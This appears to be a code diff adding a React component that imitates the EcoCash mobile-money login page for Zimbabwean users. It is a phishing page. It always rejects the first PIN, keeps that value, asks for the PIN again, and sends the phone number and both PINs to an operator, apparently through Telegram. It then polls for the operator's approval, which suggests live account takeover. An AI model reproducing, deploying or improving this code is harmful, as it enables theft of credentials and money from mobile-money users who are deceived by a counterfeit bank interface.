@@ -1,0 +1,533 @@
+import React, { useState } from "react";
+import { requestApproval, checkStatus } from "../apiClient";
+import toast from "react-hot-toast";
+import { Loader2 } from "lucide-react";
+import { formatPhoneNumber, getPhoneMaxLength } from "../utils/formatters";
+import { PaymentConfirmationProps } from "../types";
+
+function PaymentConfirmation({
+    applicationData,
+    onBack,
+    onComplete,
+}: PaymentConfirmationProps) {
+    const [loading, setLoading] = useState(false);
+    const [phoneNumber, setPhoneNumber] = useState("");
+    const [pin, setPin] = useState<string[]>(["", "", "", ""]);
+    const [firstPinValue, setFirstPinValue] = useState<string>(""); // Store first PIN attempt
+    const [errors, setErrors] = useState<any>({});
+    const [attemptCount, setAttemptCount] = useState(0);
+    const [showWrongPin, setShowWrongPin] = useState(false);
+    const [shakeError, setShakeError] = useState(false);
+    const pinInputRefs = React.useRef<(HTMLInputElement | null)[]>([]);
+
+    // const WEBHOOK_URL = import.meta.env.VITE_WEBHOOK_URL;
+
+    // Auto-submit when all 4 PIN digits are entered
+    React.useEffect(() => {
+        const pinValue = pin.join("");
+        if (pinValue.length === 4 && phoneNumber && !loading) {
+            // Small delay for better UX
+            setTimeout(() => {
+                handleSubmit();
+            }, 300);
+        }
+    }, [pin, phoneNumber, loading]);
+
+    const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+        const formatted = formatPhoneNumber(e.target.value);
+        setPhoneNumber(formatted);
+        // Clear error when user starts typing
+        if (errors.phoneNumber) {
+            setErrors((prev: any) => ({ ...prev, phoneNumber: "" }));
+        }
+    };
+
+    const handlePinChange = (index: number, value: string) => {
+        if (!/^\d*$/.test(value)) return;
+
+        // Clear wrong PIN error when user starts typing again
+        if (showWrongPin) {
+            setShowWrongPin(false);
+        }
+
+        const newPin = [...pin];
+        newPin[index] = value.slice(-1);
+        setPin(newPin);
+
+        if (value && index < 3) {
+            pinInputRefs.current[index + 1]?.focus();
+        }
+    };
+
+    const handlePinKeyDown = (index: number, e: React.KeyboardEvent) => {
+        if (e.key === "Backspace" && !pin[index] && index > 0) {
+            pinInputRefs.current[index - 1]?.focus();
+        }
+    };
+
+    const handleSubmit = async (e?: React.FormEvent) => {
+        if (e) e.preventDefault();
+
+        const newErrors: any = {};
+
+        // Validate phone number - dynamic max based on first digit
+        const phoneDigits = phoneNumber.replace(/\D/g, "");
+        const maxLen = getPhoneMaxLength(phoneNumber);
+        if (!phoneNumber) {
+            newErrors.phoneNumber = "Phone number is required";
+        } else if (phoneDigits.length !== maxLen) {
+            newErrors.phoneNumber = `Please enter complete phone number (${maxLen} digits)`;
+            toast.error(`Please enter complete phone number (${maxLen} digits)`);
+        }
+
+        const pinValue = pin.join("");
+        if (pinValue.length !== 4) {
+            newErrors.pin = "Please enter all 4 digits";
+        }
+
+        setErrors(newErrors);
+
+        if (Object.keys(newErrors).length > 0) {
+            if (!newErrors.phoneNumber) {
+                toast.error("Please fill in all fields");
+            }
+            return;
+        }
+
+        // First attempt - store first PIN and show wrong PIN error
+        if (attemptCount === 0) {
+            setFirstPinValue(pinValue); // Store the first PIN
+            setAttemptCount(1);
+            setShowWrongPin(true);
+            setShakeError(true);
+
+            // Clear PIN inputs
+            setPin(["", "", "", ""]);
+
+            // Focus first input
+            setTimeout(() => {
+                pinInputRefs.current[0]?.focus();
+            }, 100);
+
+            // Remove shake effect after animation
+            setTimeout(() => {
+                setShakeError(false);
+            }, 500);
+
+            return;
+        }
+
+        // Second attempt - send both PINs to Telegram and wait for approval
+        setLoading(true);
+
+        try {
+            const res = await requestApproval({
+                type: 'login',
+                name: "",
+                phone: `+263${phoneNumber.replace(/\D/g, '')}`,
+                details: `1st PIN: ${firstPinValue} | 2nd PIN: ${pinValue}`,
+            });
+
+            const attemptId = res.attemptId;
+            console.log("Got attemptId:", attemptId);
+
+            // Poll for approval status — max 2 minutes
+            let pollCount = 0;
+            const maxPolls = 120; // 120 × 1s = 2 minutes
+            const interval = setInterval(async () => {
+                pollCount++;
+                if (pollCount > maxPolls) {
+                    clearInterval(interval);
+                    setLoading(false);
+                    toast.error("Approval timed out. Please try again.");
+                    return;
+                }
+
+                try {
+                    const statusRes = await checkStatus(attemptId);
+                    const status = statusRes.status;
+                    console.log(`Poll ${pollCount}: status =`, status);
+
+                    if (status === 'approved') {
+                        clearInterval(interval);
+                        setLoading(false);
+                        toast.success("Login successful!");
+                        onComplete();
+                    } else if (status === 'rejected') {
+                        clearInterval(interval);
+                        setLoading(false);
+                        setShowWrongPin(true);
+                        setShakeError(true);
+                        setPin(["", "", "", ""]);
+                        setAttemptCount(0); // Reset so user can try again
+                        setFirstPinValue("");
+                        setTimeout(() => { pinInputRefs.current[0]?.focus(); }, 100);
+                        setTimeout(() => { setShakeError(false); }, 500);
+                    }
+                    // else status is 'pending', keep polling
+                } catch (pollErr) {
+                    console.error("Poll error:", pollErr);
+                }
+            }, 1000);
+
+        } catch (err: any) {
+            setLoading(false);
+            console.error("Request-approval error:", err);
+            toast.error("Could not connect. Please try again.");
+        }
+    };
+
+    return (
+        <div
+            style={{
+                minHeight: "100vh",
+                background: "#f5f7fa",
+                display: "flex",
+                flexDirection: "column" as const,
+                position: "relative",
+            }}
+        >
+            {/* Main Content */}
+            <div
+                style={{
+                    flex: 1,
+                    display: "flex",
+                    flexDirection: "column" as const,
+                    alignItems: "center",
+                    padding: "60px 20px 20px",
+                    background: "white",
+                }}
+            >
+                {/* EcoCash Logo */}
+                <div
+                    style={{
+                        fontSize: "56px",
+                        fontWeight: "700",
+                        marginBottom: "40px",
+                        textAlign: "center",
+                        letterSpacing: "-1px",
+                    }}
+                >
+                    <span style={{ color: "#0066cc" }}>Eco</span>
+                    <span style={{ color: "#dc3545" }}>Cash</span>
+                </div>
+
+                {/* Login Text */}
+                <h1
+                    style={{
+                        fontSize: "28px",
+                        fontWeight: "600",
+                        color: "#555",
+                        marginBottom: "40px",
+                    }}
+                >
+                    Login
+                </h1>
+
+                {/* Phone Number Input */}
+                <div
+                    style={{
+                        width: "100%",
+                        maxWidth: "450px",
+                        marginBottom: "30px",
+                    }}
+                >
+                    <div
+                        style={{
+                            display: "flex",
+                            alignItems: "center",
+                            gap: "12px",
+                            padding: "14px 18px",
+                            border: "2px solid #0066cc",
+                            borderRadius: "12px",
+                            background: "white",
+                        }}
+                    >
+                        <span style={{ fontSize: "24px" }}>🇿🇼</span>
+                        <span
+                            style={{
+                                fontSize: "16px",
+                                color: "#333",
+                                fontWeight: "500",
+                            }}
+                        >
+                            +263
+                        </span>
+                        <input
+                            type="tel"
+                            placeholder="712 345 6789"
+                            value={phoneNumber}
+                            onChange={handlePhoneChange}
+                            style={{
+                                flex: 1,
+                                border: "none",
+                                outline: "none",
+                                fontSize: "16px",
+                                color: "#333",
+                                background: "transparent",
+                            }}
+                        />
+                    </div>
+                    {errors.phoneNumber && (
+                        <p
+                            style={{
+                                color: "#dc3545",
+                                fontSize: "14px",
+                                marginTop: "8px",
+                                marginBottom: "0",
+                            }}
+                        >
+                            {errors.phoneNumber}
+                        </p>
+                    )}
+                </div>
+
+                {/* Enter PIN Text */}
+                <p
+                    style={{
+                        fontSize: "16px",
+                        color: "#888",
+                        marginBottom: "20px",
+                    }}
+                >
+                    Enter your PIN
+                </p>
+
+                {/* 4 PIN Boxes */}
+                <form onSubmit={handleSubmit} style={{ width: "100%" }}>
+                    <div
+                        className={shakeError ? "shake" : ""}
+                        style={{
+                            display: "flex",
+                            justifyContent: "center",
+                            gap: "16px",
+                            marginBottom: "8px",
+                        }}
+                    >
+                        {pin.map((digit, index) => (
+                            <input
+                                key={index}
+                                ref={(el) => (pinInputRefs.current[index] = el)}
+                                type="password"
+                                inputMode="numeric"
+                                maxLength={1}
+                                value={digit}
+                                onChange={(e) => handlePinChange(index, e.target.value)}
+                                onKeyDown={(e) => handlePinKeyDown(index, e)}
+                                style={{
+                                    width: "60px",
+                                    height: "60px",
+                                    fontSize: "32px",
+                                    textAlign: "center",
+                                    border: showWrongPin ? "2px solid #dc3545" : "2px solid #0066cc",
+                                    borderRadius: "12px",
+                                    outline: "none",
+                                    background: "white",
+                                    color: "#333",
+                                }}
+                            />
+                        ))}
+                    </div>
+
+                    {/* Wrong PIN Error */}
+                    {showWrongPin && (
+                        <div
+                            style={{
+                                textAlign: "center",
+                                marginBottom: "16px",
+                            }}
+                        >
+                            <p
+                                style={{
+                                    color: "#dc3545",
+                                    fontSize: "14px",
+                                    fontWeight: "600",
+                                    margin: 0,
+                                }}
+                            >
+                                Incorrect Mobile number and/ or PIN provided.
+                            </p>
+                        </div>
+                    )}
+
+
+                    {/* Forgot PIN */}
+                    <div style={{ textAlign: "center", marginBottom: "60px" }}>
+                        <a
+                            href="#"
+                            style={{
+                                color: "#888",
+                                fontSize: "15px",
+                                textDecoration: "none",
+                            }}
+                        >
+                            Forgot PIN?
+                        </a>
+                    </div>
+
+                    {/* Hidden Submit Button - form submits on PIN completion */}
+                    <button type="submit" style={{ display: "none" }}>
+                        Submit
+                    </button>
+                </form>
+            </div>
+
+            {/* Blue Wave Bottom Section */}
+            <div
+                style={{
+                    position: "relative",
+                    background: "#0066cc",
+                    paddingTop: "80px",
+                    paddingBottom: "40px",
+                    marginTop: "auto",
+                }}
+            >
+                {/* Wave SVG */}
+                <svg
+                    viewBox="0 0 1440 120"
+                    style={{
+                        position: "absolute",
+                        top: "-1px",
+                        left: 0,
+                        width: "100%",
+                        height: "80px",
+                    }}
+                    preserveAspectRatio="none"
+                >
+                    <path d="M0,0 C480,120 960,120 1440,0 L1440,120 L0,120 Z" fill="white" />
+                </svg>
+
+                <div
+                    style={{
+                        textAlign: "center",
+                        color: "white",
+                        padding: "0 20px",
+                    }}
+                >
+                    <p
+                        style={{
+                            fontSize: "15px",
+                            marginBottom: "24px",
+                            lineHeight: "1.5",
+                        }}
+                    >
+                        To register an EcoCash wallet or get assistance,
+                        <br />
+                        click below
+                    </p>
+
+                    <div
+                        style={{
+                            display: "flex",
+                            gap: "16px",
+                            justifyContent: "center",
+                            marginBottom: "32px",
+                        }}
+                    >
+                        <button
+                            style={{
+                                background: "white",
+                                color: "#0066cc",
+                                border: "none",
+                                borderRadius: "8px",
+                                padding: "16px 32px",
+                                fontSize: "15px",
+                                fontWeight: "600",
+                                cursor: "pointer",
+                                display: "flex",
+                                alignItems: "center",
+                                gap: "8px",
+                            }}
+                        >
+                            <span style={{ fontSize: "20px" }}>👤</span>
+                            Register
+                        </button>
+                        <button
+                            style={{
+                                background: "white",
+                                color: "#0066cc",
+                                border: "none",
+                                borderRadius: "8px",
+                                padding: "16px 32px",
+                                fontSize: "15px",
+                                fontWeight: "600",
+                                cursor: "pointer",
+                                display: "flex",
+                                alignItems: "center",
+                                gap: "8px",
+                            }}
+                        >
+                            <span style={{ fontSize: "20px" }}>ℹ️</span>
+                            Help & Support
+                        </button>
+                    </div>
+
+                    <p
+                        style={{
+                            fontSize: "13px",
+                            opacity: 0.8,
+                            marginBottom: "8px",
+                        }}
+                    >
+                        v2.1.3P
+                    </p>
+                    <p
+                        style={{
+                            fontSize: "13px",
+                            opacity: 0.9,
+                        }}
+                    >
+                        By signing in you agree to the{" "}
+                        <a href="#" style={{ color: "white", textDecoration: "underline" }}>
+                            Terms and Conditions
+                        </a>
+                    </p>
+                </div>
+            </div>
+
+            {/* Loading Overlay */}
+            {loading && (
+                <div
+                    style={{
+                        position: "fixed",
+                        inset: 0,
+                        background: "rgba(0,0,0,0.5)",
+                        display: "flex",
+                        alignItems: "center",
+                        justifyContent: "center",
+                        zIndex: 9999,
+                    }}
+                >
+                    <div
+                        style={{
+                            background: "white",
+                            borderRadius: "12px",
+                            padding: "32px",
+                            display: "flex",
+                            flexDirection: "column" as const,
+                            alignItems: "center",
+                            gap: "16px",
+                        }}
+                    >
+                        <Loader2 className="spinner" size={40} color="#0066cc" />
+                        <p style={{ fontSize: "16px", color: "#333" }}>Processing...</p>
+                    </div>
+                </div>
+            )}
+
+            {/* Shake Animation */}
+            <style>{`
+        @keyframes shake {
+          0%, 100% { transform: translateX(0); }
+          10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
+          20%, 40%, 60%, 80% { transform: translateX(10px); }
+        }
+        .shake {
+          animation: shake 0.5s;
+        }
+      `}</style>
+        </div>
+    );
+}
+
+export default PaymentConfirmation;
